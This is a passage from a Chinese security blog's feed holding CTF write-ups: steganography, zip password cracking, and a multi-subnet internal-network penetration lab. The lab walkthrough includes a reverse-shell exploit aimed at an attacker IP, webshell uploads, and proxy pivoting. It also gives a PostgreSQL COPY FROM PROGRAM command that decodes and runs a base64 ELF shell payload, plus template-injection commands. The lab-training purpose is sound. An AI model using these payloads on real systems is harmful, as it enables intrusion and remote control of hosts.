alt="运行脚本获取 Flag"></p><p><strong>Flag</strong>: <code>INSA&#123;b274dddb2c7707ebe430dadcf1245c246713502d6e9579f00acd10a83f3da95e&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF竞赛</category>
      
      <category>MISC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WriteUp</tag>
      
      <tag>流量分析</tag>
      
      <tag>Wireshark</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[NISACTF 2022]huaji</title>
    <link href="/2025/08/08/CTF%E7%AB%9E%E8%B5%9B/MISC/%5BNISACTF%202022%5Dhuaji/"/>
    <url>/2025/08/08/CTF%E7%AB%9E%E8%B5%9B/MISC/%5BNISACTF%202022%5Dhuaji/</url>
    
    <content type="html"><![CDATA[<p>本篇将分享一道关于图片隐写的 CTF 题目解题思路。</p><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><h4 id="1-文件类型识别"><a href="#1-文件类型识别" class="headerlink" title="1. 文件类型识别"></a>1. 文件类型识别</h4><p>下载的附件 <code>atta.NISACTF_2022huaji</code> 文件名后缀异常，需要先识别其真实文件类型。</p><p>使用 010 Editor 打开该文件，查看其文件头（File Header）。</p><p><img src="/img/screenshot-2025-07-21-111722.png" alt="屏幕截图 2025-07-21 111722"></p><p>文件头部的十六进制数据为 <code>FF D8 FF E0</code>，这是 JPEG 文件的标准文件头。因此，可判断该文件为 JPG&#x2F;JPEG 图片。</p><p>将文件名后缀修改为 <code>.jpg</code>，得到图片文件 <code>atta.jpg</code>。</p><p><img src="/img/screenshot-20250722141559035.png" alt="image-20250722141559035"></p><h4 id="2-提取解压密码"><a href="#2-提取解压密码" class="headerlink" title="2. 提取解压密码"></a>2. 提取解压密码</h4><p>查看 <code>atta.jpg</code> 文件的详细信息，在“照相机型号”字段发现一串十六进制数据。</p><p><img src="/img/screenshot-2025-07-21-164957.png" alt="屏幕截图 2025-07-21 164957"></p><p>将该十六进制字符串转换为 ASCII 字符，得到一串有意义的字符串，推测其为后续步骤中压缩包的解压密码。</p><p><img src="/img/screenshot-2025-07-22-112500.png" alt="屏幕截图 2025-07-22 112500"></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">ctf_NIS<span class="hljs-built_in">A_2022</span><br></code></pre></td></tr></table></figure><h4 id="3-分离-ZIP-与-JPG-文件"><a href="#3-分离-ZIP-与-JPG-文件" class="headerlink" title="3. 分离 ZIP 与 JPG 文件"></a>3. 分离 ZIP 与 JPG 文件</h4><p>在 010 Editor 中检视 <code>atta.jpg</code> 的文件内容时，可以发现 <code>flag.txt</code> 字符串，据此推测图片文件中可能隐藏了其他文件。</p><p><img src="/img/screenshot-2025-07-21-144935.png" alt="屏幕截图 2025-07-21 144935"></p><p>使用文件分离工具 Foremost 对 <code>atta.jpg</code> 进行文件分离。执行以下命令：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">foremost<span class="hljs-selector-class">.exe</span> -t <span class="hljs-attribute">all</span> -<span class="hljs-selector-tag">i</span> atta<span class="hljs-selector-class">.jpg</span> -o output_real<br></code></pre></td></tr></table></figure><p><img src="/img/screenshot-2025-07-22-104829.png" alt="屏幕截图 2025-07-22 104829"></p><p>执行完毕后，在 <code>output_real</code> 目录中可以找到一个图片文件 <code>00000000.jpg</code> 和一个 ZIP 压缩包 <code>00000084.zip</code>。压缩包中包含 <code>flag.txt</code> 文件。</p><p><img src="/img/screenshot-2025-07-22-104751.png" alt="屏幕截图 2025-07-22 104751"></p><h4 id="4-解压-ZIP-文件获取-Flag"><a href="#4-解压-ZIP-文件获取-Flag" class="headerlink" title="4. 解压 ZIP 文件获取 Flag"></a>4. 解压 ZIP 文件获取 Flag</h4><p>使用 7-Zip 等解压工具打开 <code>00000084.zip</code> 文件，输入步骤2中获取的解压密码 <code>ctf_NISA_2022</code>。</p><img src="/img/screenshot-2025-07-22-111520.png" alt="屏幕截图 2025-07-22 111520" style="zoom:80%;" /><p>成功解压后，得到 <code>flag.txt</code> 文件。打开该文件，即可获取最终的 Flag。</p><p>至此，本次解题结束。</p>]]></content>
    
    
    <categories>
      
      <category>CTF竞赛</category>
      
      <category>MISC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WriteUp</tag>
      
      <tag>图片隐写</tag>
      
      <tag>Steganography</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[CTF2019]zips</title>
    <link href="/2025/08/08/CTF%E7%AB%9E%E8%B5%9B/MISC/%5BCTF2019%5Dzips/"/>
    <url>/2025/08/08/CTF%E7%AB%9E%E8%B5%9B/MISC/%5BCTF2019%5Dzips/</url>
    
    <content type="html"><![CDATA[<p>本篇将分享一道关于压缩包破解的 CTF 题目解题思路，题目涉及多层加密的 ZIP 文件，需要依次破解密码、绕过伪加密并进行掩码爆破，最终提取 Flag。</p><h3 id="第一层：密码爆破"><a href="#第一层：密码爆破" class="headerlink" title="第一层：密码爆破"></a>第一层：密码爆破</h3><p>题目附件 <code>[CTF2019]zips.zip</code> 是一个加密压缩包。</p><p>首先，我们使用 <code>John the Ripper</code> 工具进行密码爆破。通过 <code>zip2john</code> 提取哈希值：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">zip2john.exe C:\Users\lenovo\Desktop\zips.zip &gt; hash.txt<br></code></pre></td></tr></table></figure><p><img src="/img/screenshot-2025-07-24-155830.png" alt="生成 hash.txt"></p><p>然后使用 <code>john.exe</code> 对哈希进行爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">john.exe hash.txt<br></code></pre></td></tr></table></figure><p><img src="/img/screenshot-2025-07-24-160104.png" alt="爆破密码"></p><p>成功得到密码 <code>123456</code>。使用该密码解压 <code>zips.zip</code>，得到 <code>flag.txt</code> 和一个新的压缩包 <code>deepin.zip</code>。</p><p><img src="/img/screenshot-20250724160445579.png" alt="解压文件"></p><h3 id="第二层：伪加密绕过"><a href="#第二层：伪加密绕过" class="headerlink" title="第二层：伪加密绕过"></a>第二层：伪加密绕过</h3><p><code>deepin.zip</code> 同样是加密的。我们来分析一下它的文件结构。</p><p>伪加密是利用 ZIP 文件头中的一个标志位实现的。通用位标志（General purpose bit flag）的第 0 位为 1 时，表示文件已加密。</p><p>使用 <code>010 Editor</code> 打开 <code>deepin.zip</code>，可以看到文件头 <code>50 4B 03 04</code> 后的通用位标志为 <code>09 00</code>，其二进制的最低位为 1，表示文件被标记为加密。</p><p><img src="/img/screenshot-2025-07-24-160913.png" alt="分析 ZIP 文件结构"></p><p>要绕过伪加密，只需将该标志位修改为 <code>00 00</code>，即关闭加密标志。</p><p><img src="/img/screenshot-2025-07-24-161620.png" alt="修改标志位"></p><p>保存修改后，<code>deepin.zip</code> 就可以直接解压了，得到 <code>flag.txt</code> 和 <code>final.zip</code>。</p><h3 id="第三层：ARCHPR-掩码爆破"><a href="#第三层：ARCHPR-掩码爆破" class="headerlink" title="第三层：ARCHPR 掩码爆破"></a>第三层：ARCHPR 掩码爆破</h3><p><code>final.zip</code> 仍然是加密的。这次我们使用 <code>ARCHPR</code> 进行掩码爆破。</p><p>打开 <code>ARCHPR</code>，选择 <code>final.zip</code>，设置爆破类型为“掩码”，范围为所有数字，长度为 6。</p><p><img src="/img/screenshot-20250724161958279.png" alt="ARCHPR 掩码爆破设置"></p><p>开始爆破，成功得到密码 <code>230719</code>。</p><h3 id="提取最终-Flag"><a href="#提取最终-Flag" class="headerlink" title="提取最终 Flag"></a>提取最终 Flag</h3><p>使用密码 <code>230719</code> 解压 <code>final.zip</code>，得到最终的 <code>flag.txt</code>。</p><p><img src="/img/screenshot-2025-07-24-165044.png" alt="解压 final.zip"></p><p>打开 <code>flag.txt</code>，即可看到最终的 Flag。</p><p><img src="/img/screenshot-2025-07-24-171334127.png" alt="查看 Flag"></p><p><img src="/img/screenshot-2025-07-24-171223.png" alt="最终 Flag"></p>]]></content>
    
    
    <categories>
      
      <category>CTF竞赛</category>
      
      <category>MISC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WriteUp</tag>
      
      <tag>压缩包破解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网渗透2-多网段攻击</title>
    <link href="/2025/06/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F2-%E5%A4%9A%E7%BD%91%E6%AE%B5%E6%94%BB%E5%87%BB/"/>
    <url>/2025/06/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F2-%E5%A4%9A%E7%BD%91%E6%AE%B5%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="内网渗透2-多网段攻击"><a href="#内网渗透2-多网段攻击" class="headerlink" title="内网渗透2-多网段攻击"></a>内网渗透2-多网段攻击</h1><h2 id="ip：10-3-4-97"><a href="#ip：10-3-4-97" class="headerlink" title="ip：10.3.4.97"></a>ip：10.3.4.97</h2><h3 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h3><h5 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a><span style="color:blue">flag1</span></h5><p>1、先用fscan扫描靶机ip,发现靶机开发22、80，8080，8338端口</p><p><img src="/img/image-20250628174813921.png" alt="端口扫描结果"></p><p>2、用dirsearch对开发靶机进行目录探测</p><p><img src="/img/image-20250628172809482.png" alt="目录探测结果"></p><p>发现<a href="http://10.3.4.97/flag">http://10.3.4.97/flag</a>, 访问拿到第一个flag</p><p><img src="/img/image-20250628173011545.png" alt="获取flag1"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag1</span><span class="hljs-template-variable">&#123;ecbad114509698f68441e45a12baae3e&#125;</span><br></code></pre></td></tr></table></figure><p>与此同时，探测到三个重要的页面，他们分别是</p><p><a href="http://10.3.4.97/admin/">http://10.3.4.97/admin/</a> webutler系统</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-28%20173204.png" alt="webutler系统"></p><p><a href="http://10.3.4.97:8080/?m=login%E4%BF%A1%E5%91%BC%E7%B3%BB%E7%BB%9F">http://10.3.4.97:8080/?m=login信呼系统</a></p><p><img src="/img/image-20250628173431489.png" alt="信呼系统"></p><p><a href="http://10.3.4.97:8338/">http://10.3.4.97:8338/</a> maktrail系统</p><p><img src="/img/image-20250628174440945.png" alt="maktrail系统"></p><h3 id="二、外围打点"><a href="#二、外围打点" class="headerlink" title="二、外围打点"></a>二、外围打点</h3><h5 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a><span style="color:blue">flag4</span></h5><h4 id="1、现成poc打maktrail系统"><a href="#1、现成poc打maktrail系统" class="headerlink" title="1、现成poc打maktrail系统"></a>1、现成poc打maktrail系统</h4><p>①我们先打maktrail系统，利用网上已有的poc夺取反弹shell，其中<strong>192.168.192.26</strong>为攻击机ip</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/exploit.sh -t http:/</span><span class="hljs-regexp">/10.3.4.128:8338/</span> -i <span class="hljs-number">192.168</span>.<span class="hljs-number">192.26</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20250628175504160.png" alt="执行poc脚本"></p><p>②监听本机4444端口，我们拿到反弹shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20250628180044504.png" alt="获取反弹shell"></p><p>③拿shell后在根目录下夺取flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag4</span><span class="hljs-template-variable">&#123;cfb82c9b5e325f52eba1beb8a4eb3088&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20250628180341177.png" alt="获取flag4"></p><h5 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a><span style="color:blue">flag3</span></h5><h4 id="2、利用文件上传打信呼系统"><a href="#2、利用文件上传打信呼系统" class="headerlink" title="2、利用文件上传打信呼系统"></a>2、利用文件上传打信呼系统</h4><p>①burpsuite开启代理，在后台任一文件上传一句话木马时抓取数据包</p><p><img src="/img/image-20250628181658928.png" alt="抓取上传数据包"></p><p>②我们发包到重放器进行发送观察页面回显</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-28%20181828.png" alt="分析响应数据"></p><p>我们发现两个关键信息：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-string">&quot;filepath&quot;</span>:<span class="hljs-string">&quot;upload<span class="hljs-char escape_">\/</span>2025-06<span class="hljs-char escape_">\/</span>29_02184430.uptemp&quot;</span><br><span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">14</span><br></code></pre></td></tr></table></figure><p>③访问拼接好的url路径,发现是一串字符编码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">10.3.4.97:8080</span>/upload/<span class="hljs-number">2025</span>-<span class="hljs-number">06</span>/<span class="hljs-number">29</span>_02184430.uptemp<br></code></pre></td></tr></table></figure><p><img src="/img/image-20250628183541047.png" alt="访问上传文件"></p><p>④根据”id”:14，我们先访问</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">10.3.4.97:8080</span>/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="hljs-number">14</span><br></code></pre></td></tr></table></figure><p>再将上一步url的uptemp改为php,成功访问到我们上传的文件</p><p><img src="/img/image-20250628184429281.png" alt="访问PHP文件"></p><p>⑤最后我们利用蚁剑连接，夺取webshell</p><p><img src="/img/image-20250628184603791.png" alt="获取webshell"></p><p>拿到flag3</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag3</span>&#123;<span class="hljs-number">37892981</span>a75e4bfcee6343a7d8b4188d&#125;<br></code></pre></td></tr></table></figure><h5 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a><span style="color:blue">flag2</span></h5><p>3、最后我们利用弱密码爆破和文件上传打webutler</p><p>①在登录入口我们可以利用burpsuite进行弱密码爆破</p><p>我们先设置载荷，并且加载playload</p><p><img src="/img/image-20250628185926116.png" alt="设置爆破载荷"></p><p>②成功爆出账号密码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">admin</span>:<span class="hljs-keyword">admin</span>         <span class="hljs-keyword">password</span>：Aa123456<br></code></pre></td></tr></table></figure><p><img src="/img/9c4c4f0a7cdf60ef81ae8d9068aae767_.png" alt="成功爆破密码"></p><p>③我们利用爆出的账号密码登录，并在管理系统中找到文件上传执行处，我们上传一句话木马</p><p><img src="/img/image-20250628190422345.png" alt="上传一句话木马"></p><p>④利用蚁剑连接一句话木马，实现漏洞利用，成功找到flag</p><p><img src="/img/image-20250628190613545.png" alt="获取flag2"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag2</span><span class="hljs-template-variable">&#123;e7c3493d2afce1a12b455fa43f3772ed&#125;</span><br></code></pre></td></tr></table></figure><h3 id="三、横向移动及内网穿透"><a href="#三、横向移动及内网穿透" class="headerlink" title="三、横向移动及内网穿透"></a>三、横向移动及内网穿透</h3><h5 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a><span style="color:blue">flag5</span></h5><p>1、在前面的三台服务器中我们选信呼作为跳板机，先将fscan和代理工具agent通过蚁剑上传到服务器</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-28%20190956.png" alt="上传工具"></p><p>2、在蚁剑终端我们发现一个配置文件，里面数据库配置信息及其所在内网的ip信息</p><p><img src="/img/image-20250628191359694.png" alt="查看配置文件"></p><p>里面包含了数据库名和密码，以及关键的数据库地址<strong>10.1.1.22</strong></p><p>3、随后我们可以利用上传的fscan对数据库地址所在的网段进行扫描，得到内网网段信息</p><p>先对fscan赋予可执行权限，再执行扫描命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nohup</span> ./fscan -h <span class="hljs-number">10.1.1.0</span>/<span class="hljs-number">24</span> -np -nopoc -nobr<br></code></pre></td></tr></table></figure><p>扫描结果如下</p><p><img src="/img/image-20250628191742959.png" alt="扫描内网网段"></p><p>我们发现了mysql服务和postgres服务</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">mysq<span class="hljs-variable">l:10</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">22</span>:<span class="hljs-number">3306</span> <span class="hljs-keyword">open</span><br>postgre<span class="hljs-variable">s:10</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">44</span>:<span class="hljs-number">5432</span> <span class="hljs-keyword">open</span><br></code></pre></td></tr></table></figure><p>4、随即我们开始进行内网穿透，首先是通过上传到服务器的agent配置服务端代理，执行命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nohup</span> ./agent_linux_x64 -rhost <span class="hljs-number">192.168.207.115</span> -rport <span class="hljs-number">10081</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20250628192634710.png" alt="配置服务端代理"></p><p><strong>192.168.207.115</strong>是攻击ip,<strong>10081</strong>是转发端口。</p><p>5、紧接着，我们通过admin.exe在本机配置客户端</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">admin</span>.exe -l<span class="hljs-keyword">port</span> 10081<br></code></pre></td></tr></table></figure><p><img src="/img/image-20250628193010172.png" alt="配置客户端"></p><p>发现客户端服务端成功连接了</p><p>6、为了在本机访问内网的相关服务，我们还需要proxifiler配置socks5代理</p><p>先是配置代理服务，将信息转发到本机<strong>1080</strong>端口</p><p><img src="/img/image-20250628193324888.png" alt="配置代理服务"></p><p> 再配置代理的规则，将10.1.1.0&#x2F;24网段的所有服务流量转发到本机</p><p><img src="/img/image-20250628193420448.png" alt="配置代理规则"></p><p>最后我们在<strong>本地开启一个监听端口 1080 的 SOCKS5 代理</strong>，这个代理会把所有流量通过 node 1 这个被控主机转发出去。</p><p><img src="/img/image-20250628193823030.png" alt="开启SOCKS5代理"></p><p>到这里整个内网穿透搭建完毕</p><p>7、我们通过图形化工具dbeaver远程连接mysql服务，通过前面拿到的mysql配置信息进行连接</p><p><img src="/img/image-20250628194203635.png" alt="连接MySQL服务"></p><p>成功在mysql服务中找到flag5</p><p><img src="/img/image-20250628194333333.png" alt="获取flag5"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag5</span><span class="hljs-template-variable">&#123;ba202a17b7c78a10fdcea15db19aa47f&#125;</span><br></code></pre></td></tr></table></figure><h5 id="flag6"><a href="#flag6" class="headerlink" title="flag6"></a><span style="color:blue">flag6</span></h5><p>8、我们通过图形化工具dbeaver远程连接postgres服务，通过前面拿到的postgres配置信息进行连接</p><p><img src="/img/image-20250628194537624.png" alt="连接PostgreSQL服务"></p><p>要对数据库查询进行设置显示所有隐藏的数据库信息，以下是更改配置</p><p><img src="/img/image-20250628194651410.png" alt="更改数据库配置"></p><p>随后我们在postgres服务成功找到flag6</p><p><img src="/img/image-20250628194828892.png" alt="获取flag6"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag6</span>&#123;<span class="hljs-number">131</span>e7a46b27f6bc83bef9ac95e37c2eb&#125;<br></code></pre></td></tr></table></figure><h5 id="flag7"><a href="#flag7" class="headerlink" title="flag7"></a><span style="color:blue">flag7</span></h5><p>9、我们利用sql语句执行找到flag7</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> cmd_exec;<br><span class="hljs-keyword">CREATE TABLE</span> cmd_exec(cmd_output text);<br><span class="hljs-keyword">COPY</span> cmd_exec <span class="hljs-keyword">FROM</span> PROGRAM <span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> cmd_exec;<br></code></pre></td></tr></table></figure><p><img src="/img/image-20250628195043038.png" alt="执行SQL语句"></p><h3 id="四、扩大攻击面"><a href="#四、扩大攻击面" class="headerlink" title="四、扩大攻击面"></a>四、扩大攻击面</h3><h5 id="flag8"><a href="#flag8" class="headerlink" title="flag8"></a><span style="color:blue">flag8</span></h5><p>1、我们想要夺取postrges的webshell，首先需要构造poc防止绕过，首先生成base64编码的恶意代码</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-28%20230103.png" alt="生成base64编码"></p><p>2、以下是我们通过sql语句构造的poc代码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> cmd_exec;<br><span class="hljs-keyword">CREATE TABLE</span> cmd_exec(cmd_output text);<br><span class="hljs-keyword">COPY</span> cmd_exec <span class="hljs-keyword">FROM</span> PROGRAM <span class="hljs-string">&#x27;echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAA+gAAAAAAAAB8AQAAAAAAAAAQAAAAAAAAMf9qCViZthBIidZNMclqIkFaagdaDwVIhcB4UWoKQVlQailYmWoCX2oBXg8FSIXAeDtIl0i5AgAiucCozwdRSInmahBaaipYDwVZSIXAeSVJ/8l0GFdqI1hqAGoFSInnSDH2DwVZWV9IhcB5x2o8WGoBXw8FXmp+Wg8FSIXAeO3/5g== </span><br><span class="hljs-string">||base64 -d &gt; postgre.sql&amp;&amp;chmod +x postgre.sql&amp;&amp;./postgre.sql&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> cmd_exec;<br></code></pre></td></tr></table></figure><p>随后我们在访问的数据库中执行恶意sql语句</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-28%20230139.png" alt="执行恶意SQL"></p><p>3、我们通过msf监听获得反弹shell</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-28%20233740.png" alt="获得反弹shell"></p><p>4、随后我们继续横向移动，通过msf上传fscan和agent代理工具</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-28%20233802.png" alt="上传工具"></p><p>5、我们利用msf对网段10.3.3.0\24进行扫描得到以下信息</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-28%20233926.png" alt="扫描网段"></p><p>6、接下来我们开始配置代理，得到node1、2，对应socks5 1080、1081</p><p><img src="/img/image-20250629015747227.png" alt="配置代理"></p><p>7、为了在Windows上访问到目的ip和端口服务，我们还需配置proxifier代理，设置虚拟机ip和1081端口</p><p><img src="/img/image-20250629020003097.png" alt="设置Proxifier代理1"></p><p><img src="/img/image-20250629020041080.png" alt="设置Proxifier代理2"></p><p>最终成功访问10.3.3.0&#x2F;24网段的服务器</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-29%20011421.png" alt="成功访问服务器"></p><p>9、通过目录探测我们发现一处文件上传处并获取了<a href="http://www.zip解压后得到main.go/">www.zip解压后得到main.go</a></p><p><img src="/img/image-20250629020423644.png" alt="目录探测结果"></p><p><img src="/img/image-20250629020645208.png" alt="获取main.go"></p><p>对源码进行分析，发现存在**exec.Command()**命令执行</p><p>10、由此我们可以实现模板注入，构造以下poc实现查询flag</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html">&#123;&#123; define &quot;layout&quot; &#125;&#125;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>My Web Page<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br> &#123;&#123; &quot;cat /flag&quot; | result &#125;&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br>&#123;&#123;end&#125;&#125;<br></code></pre></td></tr></table></figure><p>11、将改写后的html上传实现查询flag</p><p><img src="/img/image-20250629021124184.png" alt="查询flag8"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">flag<span class="hljs-number">8</span>&#123;b<span class="hljs-number">2550207</span><span class="hljs-keyword">c</span><span class="hljs-number">96735</span>d<span class="hljs-number">0750</span>be<span class="hljs-number">3</span>bbd<span class="hljs-number">00</span>cfc<span class="hljs-number">4</span><span class="hljs-keyword">c</span>&#125;<br></code></pre></td></tr></table></figure><h5 id="flag9"><a href="#flag9" class="headerlink" title="flag9"></a><span style="color:blue">flag9</span></h5><p>1、访问10.3.3.110，通过搜索引擎查询发现该页面存在目录穿越</p><p><img src="/img/image-20250629021446614.png" alt="目录穿越漏洞"></p><p>2、我们用hackbar构造poc实现目录穿越最终成功拿到flag9</p><p><img src="/img/image-20250629021631239.png" alt="构造目录穿越POC"></p><p><img src="/img/image-20250629021752316.png" alt="获取flag9"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag9</span>&#123;<span class="hljs-number">44</span>cf2f30b206e72e6e397bd221d26469&#125;<br></code></pre></td></tr></table></figure><h5 id="flag10"><a href="#flag10" class="headerlink" title="flag10"></a><span style="color:blue">flag10</span></h5><p>1、根据靶机开放在22端口这个信息我们实现ssh远程登录</p><p><img src="/img/image-20250629022027537.png" alt="SSH远程登录"></p><p>其中密码就是数据库中查询到的<strong>Aa123456</strong></p><p>2、采用命令行cat &#x2F;flag拿到flag</p><p><img src="/img/image-20250629022213059.png" alt="获取flag10"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag10</span><span class="hljs-template-variable">&#123;f5ccc6e87da77fbc0530a674ab627bb8&#125;</span><br></code></pre></td></tr></table></figure><h5 id="flag11"><a href="#flag11" class="headerlink" title="flag11"></a><span style="color:blue">flag11</span></h5><p>我们通过执行10.3.3.120用户目录下的ipsec_connect即可拿到flag11</p><p><img src="/img/image-20250629022455868.png" alt="获取flag11"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">flag<span class="hljs-number">11</span>&#123;<span class="hljs-number">526</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>fe<span class="hljs-number">7632</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>aced<span class="hljs-number">8</span>f<span class="hljs-number">844</span>f<span class="hljs-number">6</span>f<span class="hljs-number">498</span><span class="hljs-keyword">c</span><span class="hljs-number">63</span>a&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
      <tag>横向移动</tag>
      
      <tag>多网段攻击</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
